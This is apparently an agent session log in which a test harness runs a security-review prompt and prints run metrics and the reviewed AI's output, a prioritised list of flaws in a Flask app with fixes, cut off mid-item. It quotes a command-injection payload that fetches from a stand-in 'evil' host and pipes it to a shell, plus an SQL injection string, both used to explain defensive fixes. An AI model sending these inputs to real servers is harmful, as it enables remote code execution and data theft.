S=<SESSION_TEMP_FOLDER>/scratchpad; cp <PROJECT_FOLDER>/prototype/tests/run_matrix.py $S/run_matrix.py; cd $S && timeout 600 python3 -I run_matrix.py $S/plugin $S/fixture $S/smoke --only P1 --conds C --jobs 1; python3 -c "
import json;d=json.load(open('$S/smoke/P1-security__C-skill+hook/summary.json'));print(json.dumps({k:v for k,v in d.items() if k!='final'},indent=1)[:3000]);print(d['final'][:2500])"; tail -5 $S/smoke/P1-security__C-skill+hook/stderr.txt

#### RESULT (is_error=False)
{"prompt": "P1-security", "cond": "C-skill+hook", "scout_skill": false, "probe_runs": 0, "scout_before_work": false, "hook_nudge_fired": true, "install_attempts": [], "first_turn_context_tokens": 40951, "cost_usd": 0.080323, "wall_s": 17.7}
{
 "scout_skill": false,
 "probe_runs": 0,
 "probe_search": 0,
 "scout_before_work": false,
 "skills_used": [],
 "tools": [
  "Read"
 ],
 "install_attempts": [],
 "permission_denials": [],
 "hook_nudge_fired": true,
 "first_turn_context_tokens": 40951,
 "cost_usd": 0.080323,
 "turns": 2,
 "duration_s": 15.7,
 "is_error": false,
 "prompt": "P1-security",
 "cond": "C-skill+hook",
 "wall_s": 17.7
}
# Security review of `app.py`

I only read the file and changed nothing.

## Prioritized fixes

**1. Command injection in `/export` (Critical), line 30**
- `fmt` comes straight from the query string and goes into a command run with `shell=True`. A request like `?format=csv;curl evil|sh` runs arbitrary commands on the server.
- **Fix:** drop the shell and validate against an allowlist.
  ```python
  if fmt not in {"csv", "json"}: abort(400)
  subprocess.check_output(["python", "export.py", "--format", fmt])
  ```

**2. Werkzeug debugger exposed on all interfaces (Critical), line 41**
- `debug=True` with `host="0.0.0.0"` serves the interactive debugger to the network. That gives remote code execution to anyone who can reach the port and get past the debugger PIN, which is a weak barrier.
- **Fix:** remove `debug=True` and bind to `127.0.0.1`. In production, run behind gunicorn or uwsgi instead of `app.run`. Control debug through an environment variable that is off by default.

**3. SQL injection in `/orders` (Critical), line 23**
- `customer` is interpolated into the query with an f-string, so `?customer=' OR '1'='1` dumps every order. Other SQL can be injected too.
- **Fix:** use a parameterized query: `conn.execute("SELECT * FROM orders WHERE customer = ?", (customer,))`.

**4. Hardcoded live API key (High), line 7**
- The `sk_live_...` secret is in source and will end up in version control. It looks like an example, but treat it as real.
- **Fix:** rotate the key if it was ever real. Load it with `os.environ["API_KEY"]` or a secrets manager, and scan git history for leaks.

**5. No authentication or authorization on any endpoint (High), lines 19–37**
- Anyone can list any customer's orders, trigger exports, and call `/refund`.
- **Fix:** add authentication (session, token or API key) and check that the caller may access the requested customer's data. Restrict `/refund` and `/export` to privileged roles.

**6. Unvalidated refund amount (Medium), lines 10–16 and 36**
- `parse_amount` has several problems:
  - `$1.5` is parsed as 105 cents, because the single digit is not scaled.
  - `$1.234` is parsed as 1,234 cents.
  - Negative values are accepted. A refund of `-100` could act as a charge or corrupt records.
  - There is no upper limit.
  - A malformed value such as `1.2.3` or `abc` raises an unhandled `ValueError` (a 500 error), and the debug traceback leaks details.
  - A missing `amount` field raises a 400 `KeyError` from Flask.
- **Fix:** use `decimal
Shell cwd was reset to /home/claude